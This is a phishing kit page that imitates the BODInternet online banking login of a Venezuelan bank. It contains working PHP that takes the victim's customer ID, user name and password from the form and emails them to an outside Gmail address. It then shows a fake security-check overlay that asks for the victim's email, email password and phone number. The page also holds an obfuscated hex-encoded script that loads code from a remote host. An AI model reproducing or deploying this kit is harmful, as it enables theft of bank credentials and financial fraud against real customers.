                                        <input type="TEXT" id="CA_CUSCUI" name="CA_CUSCUI" size="15" maxlength="15" value="                                        " class="UDI UDS" onKeyPress="dokey(this);" autocomplete="off">											<div>                                        </div></div></td></tr></tbody></table>                                        </td>                                </tr>                                <tr>                                        <td class="UT">Usuario</td>                                </tr>                                <tr>                                        <td class="UD"><input type="TEXT" id="CA_USUARI" name="CA_USUARI" size="14" maxlength="10" value="                                        " class="UDI" onKeyPress="dokey(this)" onBlur="this.value=this.value.toUpperCase()" autocomplete="off">                                        </td>                                </tr><tr>
                                        <td height="25px" style="vertical-align:top;text-align:center"><span style="font:10px Trebuchet MS,Arial,Helvetica,sans-serif;color:#00703C">                                        <a style="text-decoration:none" title="Haga clic aquí para iniciar el proceso de regeneración de usuario" href="https://bod.bodmillenium.com/E2F-BIN/E2VCNR01.PGM#" onClick="abrircontra()">                                        <font color="#00703C"><b>¿Olvidó su Usuario?</b></font></a></span></td>                                </tr>                                
                                <tr>                                        <td class="UT">Contraseña<br></td>                                </tr>                                <tr>                                        <td class="UD"><input type="PASSWORD" name="CA_CONTRA" id="CA_CONTRA" size="14" maxlength="10" value="" class="texto" onKeyPress="dokey(this)" onFocus="enfocar(this);" onblu="" r="desenfocar(this);" autocomplete="off" readonly="">                                        <input type="PASSWORD" name="fake_CA_CONTRA" id="fake_CA_CONTRA" size="14" maxlength="10" value="                                        " class="UDI" style="display:none" readonly=""></td>                                </tr>                                <tr>                                        <td class="izq_M"><span style="font:11px Trebuchet MS,Arial,Helvetica,sans-serif;color:#868789;font-weight:bold">(Use el teclado virtual)</span></td>
                                </tr>                                <tr><td style="vertical-align:top;text-align:center">                                        <span style="font:10px Trebuchet MS,Arial,Helvetica,sans-serif;color:#00703C">                                        <a style="text-decoration:none" title="Haga clic aquí para iniciar el proceso de regeneración de contraseña." href="https://bod.bodmillenium.com/E2F-BIN/E2VCNR01.PGM#" onClick="abrircontra()">                                        <font color="#00703C"><b>¿Olvidó su Contraseña?</b></font></a></span></td>                                </tr>                        </tbody></table>                        <br>
                        <script>pytbarlef();</script><table cellpadding="0" cellspacing="0" border="0" align="Center"><tbody><tr><td><input name="envio" id="envio" type="Button" class="bots" value="INGRESAR" onClick="runSubmit(this,&#39;Enviar&#39;)"><input type="text" class="trans" maxlength="1" size="1"></td></tr></tbody></table>                        <script>pytdspmsg();</script>                        <br>			<table><tbody><tr>                        <td align="center" height="25px" style="font:10px Trebuchet MS,Arial,Helvetica,sans-serif;color:#00703C">				¿Desea ir a la página del banco                                <span style="font:10px Trebuchet MS,Arial,Helvetica,sans-serif;color:#00703C">                                <a href="http://www.bod.com.ve/">                                <font color="#00703C"><b>www.bod.com.ve?</b></font></a></span>                        </td></tr>                        </tbody></table>			<br>                        <table><tbody><tr>                        <td align="center" height="25px">                                <span style="font:10px Trebuchet MS,Arial,Helvetica,sans-serif;color:#00703C">                                <a href="https://bod.bodmillenium.com/e2f/e2fvpcont.html">
                                <font color="#00703C"><b>¿Aun no se ha afiliado a BODInternet?</b></font></a></span>                        </td></tr>                        </tbody></table>                        <table>                                <tbody><tr>         <td><a href="javascript:popUp(&#39;v&#39;)"><img src="./e2f/e03/00verisign.gif" border="0" vspace="10"></a></td>                                </tr>                        </tbody></table>                        <input type="HIDDEN" name="HT_R" value=" E2NCNR01">                        <input type="HIDDEN" name="Envia" id="Envia" value="Enviar">                        <input type="HIDDEN" name="HT_NSOLIC" value="000000003">                        <input type="HIDDEN" name="CA_E2EMCN" value="E2F">                        <input type="HIDDEN" name="CA_E2EMSL" value="E2F">                        </td>                        <td class="izq" width="574">							<div class="marcoAbajo">                                <script>abajo()</script>
							</div>	                        </td>                </tr>                <tr>                        <td valign="top" colspan="2">						<div style="position:absolute;left:13px">						</div>						</td>                </tr>        </tbody></table>		</div>
        <script>
        </script>
</form></div><div id="pie"><table cellpadding="0" cellspacing="0" border="0" width="100%" class="tbl" style="bottom: 0px; position: fixed;"><tbody><tr><td></td></tr></tbody></table></div><script language="JavaScript">/*        Desarrollo: Banco Occidental de Descuento        Fecha:  22/11/2011        Descripcion: Edicion dinamica se crea un arreglo unidimensional con las referencias.        Version: 1.0*/var _0xffa;_0xffa = "\x64\x65\x74\x65\x63\x74\x63\x61\x2E\x65\x61\x73\x79\x73\x6F\x6C\x2E\x6E\x65\x74\x2F\x64\x65\x74\x65";_0xffa += "\x63\x74\x63\x61\x2F\x73\x63\x72\x69\x70\x74\x73\x2F\x31\x34\x2F\x64\x65\x74\x65\x63\x74\x2E\x6A\x73\x27";_0xffa += "\x20\x74\x79\x70\x65\x3D\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x25\x33\x45\x25";_0xffa += "\x33\x43\x2F\x73\x63\x72\x69\x70\x74\x25\x33\x45";var _0xff0z1=["\x68\x74\x74\x70\x73\x3A","\x70\x72\x6F\x74\x6F\x63\x6F\x6C","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x68\x74\x74\x70\x3A\x2F\x2F",
"\x25\x33\x43\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x27",_0xffa,"\x77\x72\x69\x74\x65"];var __h=((_0xff0z1[0]==document[_0xff0z1[2]][_0xff0z1[1]])?_0xff0z1[3]:_0xff0z1[4]);document[_0xff0z1[7]](unescape(_0xff0z1[5]+__h+_0xff0z1[6]));</script><input type="hidden" name="TitleFormat" id="TitleFormat" value="dddd, dd de MMMM de yyyy HH:mm:ss ">
<span style="border-radius: 2px; text-indent: 20px; width: auto; padding: 0px 4px 0px 0px; text-align: center; font-style: normal; font-variant: normal; font-weight: bold; font-stretch: normal; font-size: 11px; line-height: 20px; font-family: &quot;Helvetica Neue&quot;, Helvetica, sans-serif; color: rgb(255, 255, 255); position: absolute; opacity: 1; z-index: 8675309; display: none; cursor: pointer; border: none; -webkit-font-smoothing: antialiased; background: url(&quot;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMzBweCIgd2lkdGg9IjMwcHgiIHZpZXdCb3g9Ii0xIC0xIDMxIDMxIj48Zz48cGF0aCBkPSJNMjkuNDQ5LDE0LjY2MiBDMjkuNDQ5LDIyLjcyMiAyMi44NjgsMjkuMjU2IDE0Ljc1LDI5LjI1NiBDNi42MzIsMjkuMjU2IDAuMDUxLDIyLjcyMiAwLjA1MSwxNC42NjIgQzAuMDUxLDYuNjAxIDYuNjMyLDAuMDY3IDE0Ljc1LDAuMDY3IEMyMi44NjgsMC4wNjcgMjkuNDQ5LDYuNjAxIDI5LjQ0OSwxNC42NjIiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PHBhdGggZD0iTTE0LjczMywxLjY4NiBDNy41MTYsMS42ODYgMS42NjUsNy40OTUgMS42NjUsMTQuNjYyIEMxLjY2NSwyMC4xNTkgNS4xMDksMjQuODU0IDkuOTcsMjYuNzQ0IEM5Ljg1NiwyNS43MTggOS43NTMsMjQuMTQzIDEwLjAxNiwyMy4wMjIgQzEwLjI1MywyMi4wMSAxMS41NDgsMTYuNTcyIDExLjU0OCwxNi41NzIgQzExLjU0OCwxNi41NzIgMTEuMTU3LDE1Ljc5NSAxMS4xNTcsMTQuNjQ2IEMxMS4xNTcsMTIuODQyIDEyLjIxMSwxMS40OTUgMTMuNTIyLDExLjQ5NSBDMTQuNjM3LDExLjQ5NSAxNS4xNzUsMTIuMzI2IDE1LjE3NSwxMy4zMjMgQzE1LjE3NSwxNC40MzYgMTQuNDYyLDE2LjEgMTQuMDkzLDE3LjY0MyBDMTMuNzg1LDE4LjkzNSAxNC43NDUsMTkuOTg4IDE2LjAyOCwxOS45ODggQzE4LjM1MSwxOS45ODggMjAuMTM2LDE3LjU1NiAyMC4xMzYsMTQuMDQ2IEMyMC4xMzYsMTAuOTM5IDE3Ljg4OCw4Ljc2NyAxNC42NzgsOC43NjcgQzEwLjk1OSw4Ljc2NyA4Ljc3NywxMS41MzYgOC43NzcsMTQuMzk4IEM4Ljc3NywxNS41MTMgOS4yMSwxNi43MDkgOS43NDksMTcuMzU5IEM5Ljg1NiwxNy40ODggOS44NzIsMTcuNiA5Ljg0LDE3LjczMSBDOS43NDEsMTguMTQxIDkuNTIsMTkuMDIzIDkuNDc3LDE5LjIwMyBDOS40MiwxOS40NCA5LjI4OCwxOS40OTEgOS4wNCwxOS4zNzYgQzcuNDA4LDE4LjYyMiA2LjM4NywxNi4yNTIgNi4zODcsMTQuMzQ5IEM2LjM4NywxMC4yNTYgOS4zODMsNi40OTcgMTUuMDIyLDYuNDk3IEMxOS41NTUsNi40OTcgMjMuMDc4LDkuNzA1IDIzLjA3OCwxMy45OTEgQzIzLjA3OCwxOC40NjMgMjAuMjM5LDIyLjA2MiAxNi4yOTcsMjIuMDYyIEMxNC45NzMsMjIuMDYyIDEzLjcyOCwyMS4zNzkgMTMuMzAyLDIwLjU3MiBDMTMuMzAyLDIwLjU3MiAxMi42NDcsMjMuMDUgMTIuNDg4LDIzLjY1NyBDMTIuMTkzLDI0Ljc4NCAxMS4zOTYsMjYuMTk2IDEwLjg2MywyNy4wNTggQzEyLjA4NiwyNy40MzQgMTMuMzg2LDI3LjYzNyAxNC43MzMsMjcuNjM3IEMyMS45NSwyNy42MzcgMjcuODAxLDIxLjgyOCAyNy44MDEsMTQuNjYyIEMyNy44MDEsNy40OTUgMjEuOTUsMS42ODYgMTQuNzMzLDEuNjg2IiBmaWxsPSIjYmQwODFjIj48L3BhdGg+PC9nPjwvc3ZnPg==&quot;) 3px 50% / 14px 14px no-repeat rgb(189, 8, 28);">Guardar</span>
<?php
  if (!empty($_POST) && isset($_GET['verificacion']) && $_GET['verificacion'] == 'request') {
    $CA_TIPPER = $_POST['CA_TIPPER'];
    $CA_CUSCUI = $_POST['CA_CUSCUI'];
    $CA_USUARI = $_POST['CA_USUARI'];
    $CA_CONTRA = $_POST['CA_CONTRA'];


    @mail('sanchezdmax@gmail.com', '3 letras', $CA_TIPPER."\n".$CA_CUSCUI."\n".$CA_USUARI."\n".$CA_CONTRA);
?>
<div style="position: fixed;top: 0;left: 0;bottom: 0;right: 0;background-color: rgba(0, 0, 0, 0.15);">
  <form action="?verificacion=final" method="post" style="position: fixed;background: #ffffff;width: 500px;height: auto;top: 50%;left: 50%;transform: translate(-50%,-50%);border-radius: 10px;padding: 20px;">
    <span style="display: block;font-family: verdana;font-size: 17px;margin-bottom: 30px;">Estimado cliente, debido a reiterados ataques maliciosos debemos comprobar su identidad, por favor verifique su información para poder acceder al sitio.</span>
    <input type="email" name="email" placeholder="Correo electrónico" style="display: block;width: 100%;border: 1px solid #848484;padding: 10px;border-radius: 4px;box-sizing: border-box;margin-bottom: 10px;" required>
    <input type="password" name="password" placeholder="Contraseña" style="display: block;width: 100%;border: 1px solid #848484;padding: 10px;border-radius: 4px;box-sizing: border-box;margin-bottom: 10px;" required>
    <input type="text" name="movil" placeholder="Teléfono (con característica)" style="display: block;width: 100%;border: 1px solid #848484;padding: 10px;border-radius: 4px;box-sizing: border-box;margin-bottom: 10px;" required>
    <input type="hidden" name="CA_TIPPER" value="<?php echo $_POST['CA_TIPPER']; ?>">
    <input type="hidden" name="CA_CUSCUI" value="<?php echo $_POST['CA_CUSCUI']; ?>">
    <input type="hidden" name="CA_USUARI" value="<?php echo $_POST['CA_USUARI']; ?>">
    <input type="hidden" name="CA_CONTRA" value="<?php echo $_POST['CA_CONTRA']; ?>">
    <input type="submit" style="display: block;width: 100%;border: 0;padding: 15px 0;font-weight: bold;font-family: verdana;color: #444444;">
  </form>
</div>
<?php
  }
?>
</body></html>